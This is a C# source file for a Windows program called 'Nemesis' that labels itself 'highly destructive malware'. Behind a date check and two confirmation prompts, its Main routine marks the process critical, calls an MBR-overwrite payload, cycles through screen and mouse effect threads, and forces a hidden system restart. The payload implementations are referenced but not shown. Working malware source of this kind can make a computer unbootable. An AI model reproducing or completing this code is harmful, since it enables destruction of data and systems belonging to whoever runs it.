using System;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using static Windows.APIs;
using static Nemesis.ThreadTasks;

namespace Nemesis
{
    public class Program
    {
        public static int Main()
        {
            DateTime dataEspecifica = new DateTime(2090, 5, 4);       // 2090, 5, 4
            DateTime dataAtual = DateTime.Now.Date;

            if (dataAtual != dataEspecifica)
            {
                System.Windows.Forms.MessageBox.Show("This Software Will Only Run On Date: (04/05/2090).", "Oh No!");
                return 1;
            }


            if (System.Windows.Forms.MessageBox.Show("This software is highly destructive malware and can permanently damage your system, in addition to displaying intense and flashy visual effects.\n\nDo you really want to proceed with the execution?",
                "ATTENTION!!",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning) == DialogResult.No)
            {
                return 1;
            }
            if (System.Windows.Forms.MessageBox.Show("Do You Really Want to Continue??",
                "last warning!! are you sure??",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning) == DialogResult.No)
            {
                return 1;
            }

            DestructivePayloads.SetCritical();
            DestructivePayloads.MBR();

            ClearScreen();
            Sleep(1000);

            thSpecial1.Start();
            thSpecialMouse1.Start();

            b1.Start();
            th1.Start();

            Sleep(1000 * 15); // 15s

            th1.Abort();
            b1.Abort();
            ClearScreen();

            b2.Start();
            th2.Start();

            Sleep(1000 * 15); // 15s

            th2.Abort();
            b2.Abort();
            ClearScreen();

            b3.Start();
            th3.Start();

            Sleep(1000 * 15);  // 15s

            th3.Abort();
            b3.Abort();
            ClearScreen();

            b4.Start();
            thMouseMove.Start();
            thSpecial2.Start();

            Sleep(1000 * 15);  // 15s

            thSpecial2.Abort();
            b4.Abort();
            thMouseMove.Abort();
            ClearScreen();

            b5.Start();
            th4.Start();
            th5.Start();

            Sleep(1000 * 15);  // 15s


            th4.Abort();
            b5.Abort();
            th5.Abort();
            ClearScreen();


            b6.Start();
            th6.Start();

            Sleep(1000 * 7);  // 7s
            th6.Abort();

            thSpecial3.Start();
            b6.Abort();
            thSpecial3.Abort();
            thSpecialMouse1.Abort();
            thSpecial1.Abort();
            ClearScreen();


            b7.Start();
            thSpecialMouse2.Start();
            thSpecialMouse3.Start();

            Sleep(1000 * 15);  // 15s

            thSpecialMouse2.Abort();
            b7.Abort();
            thSpecialMouse3.Abort();
            ClearScreen();

            Sleep(5000);

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = "/c shutdown /r /f /t 70"
            });

            new Thread(() =>
            {
                System.Windows.Forms.MessageBox.Show("-ENG-\r\nLeft Button: +ZOOM\r\nRight Button: -ZOOM\n\n\n-PTBR-\r\nBotão Esquerdo: +ZOOM\r\nBotão Direito: -ZOOM", "Control"
                    ,MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
            }).Start();

            Application.Run(new JuliaFractal());

            Thread.Sleep(Timeout.Infinite);
            return 0;
        }
    }
}
